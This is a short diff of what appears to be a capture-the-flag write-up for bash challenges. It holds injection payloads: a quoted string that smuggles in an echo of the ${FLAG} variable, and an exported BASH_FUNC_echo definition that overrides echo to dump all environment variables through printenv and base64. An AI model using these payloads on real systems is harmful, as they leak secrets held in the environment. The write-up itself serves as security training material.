@@ -6,7 +6,14 @@ Hello, there!'; echo "Here is your flag: ${FLAG}" | base64 ;echo 'General Kenobi
 
 ```
  
-# Chall 2 & 3
+# Chall 2
+
+```
+Not a release :(
+BASH_FUNC_echo%%=() { builtin echo "coucou $@" | printenv | base64 ;}
+```
+
+# Chall 3
  
 [Bash variables doc](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
  
